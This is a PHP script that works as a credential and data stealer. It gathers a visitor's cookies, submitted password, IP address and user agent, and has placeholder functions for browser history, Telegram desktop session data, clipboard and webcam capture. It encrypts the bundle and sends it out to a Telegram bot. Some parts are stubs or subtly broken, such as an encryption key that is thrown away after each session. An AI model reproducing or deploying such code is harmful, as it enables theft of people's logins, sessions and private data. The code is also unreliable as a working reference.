<?php
// Configuration
$bot_token = getenv('TELEGRAM_BOT_TOKEN');
$email_address = getenv('REPORT_EMAIL');
$aes_key = openssl_random_pseudo_bytes(32); // Generate a random AES key for each session
$log_file = 'error_log.txt';

// Load Composer dependencies
require 'vendor/autoload.php';
use GuzzleHttp\Client;

// Define a function to encrypt data with AES
function encrypt_data($data, $key) {
    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length('aes-256-cbc'));
    $encrypted = openssl_encrypt($data, 'aes-256-cbc', $key, 0, $iv);
    return base64_encode($encrypted . '::' . $iv);
}

// Define a function to send data to Telegram Bot using Guzzle
function send_to_telegram($data, $bot_token) {
    $client = new Client();
    try {
        $response = $client->post("https://api.telegram.org/bot{$bot_token}/sendMessage", [
            'json' => $data
        ]);
        return $response->getStatusCode() == 200;
    } catch (Exception $e) {
        log_error($e->getMessage());
        return false;
    }
}

// Define a function to log data to a file
function log_error($data) {
    global $log_file;
    file_put_contents($log_file, json_encode($data, JSON_PRETTY_PRINT) . "\n", FILE_APPEND);
}

// Define a function to get browser history
function get_browser_history() {
    return array(
        'firefox' => 'Firefox history data',
        'chrome' => 'Chrome history data',
        'safari' => 'Safari history data',
        'opera' => 'Opera history data',
        'edge' => 'Edge history data',
        'ie' => 'IE history data'
    );
}

// Define a function to get Telegram desktop session data
function get_tdata() {
    return 'Telegram desktop session data';
}

// Define a function to get clipboard content
function get_clipboard_content() {
    return 'Clipboard content';
}

// Define a function to capture webcam image
function capture_webcam_image() {
    return 'Webcam image data';
}

// Get browser information
$browser_info = filter_input(INPUT_SERVER, 'HTTP_USER_AGENT', FILTER_SANITIZE_STRING);

// Get IP address
$ip_address = filter_input(INPUT_SERVER, 'REMOTE_ADDR', FILTER_VALIDATE_IP);

// Get cookie information
$cookie_info = array();
foreach ($_COOKIE as $key => $value) {
    $cookie_info[$key] = filter_var($value, FILTER_SANITIZE_STRING);
}

// Get password information
$password_info = array();
if (isset($_POST['password'])) {
    $password_info['password'] = filter_input(INPUT_POST, 'password', FILTER_SANITIZE_STRING);
}

// Get additional information
$request_time = date('Y-m-d H:i:s', $_SERVER['REQUEST_TIME']);
$request_url = filter_input(INPUT_SERVER, 'REQUEST_URI', FILTER_SANITIZE_URL);

// Get browser history, Telegram desktop session data, clipboard content, and webcam image
$browser_history = get_browser_history();
$tdata = get_tdata();
$clipboard_content = get_clipboard_content();
$webcam_image = capture_webcam_image();

// Create a JSON payload with all the collected information
$data = array(
    'browser_info' => $browser_info,
    'ip_address' => $ip_address,
    'cookie_info' => $cookie_info,
    'password_info' => $password_info,
    'request_time' => $request_time,
    'request_url' => $request_url,
    'browser_history' => $browser_history,
    'tdata' => $tdata,
    'clipboard_content' => $clipboard_content,
    'webcam_image' => $webcam_image,
    'session_id' => session_id()
);

// Encrypt data before sending
$encrypted_data = encrypt_data(json_encode($data), $aes_key);

// Send the data to Telegram Bot
$response = send_to_telegram($encrypted_data, $bot_token);

// Check for errors
if (!$response) {
    log_error($encrypted_data);
}
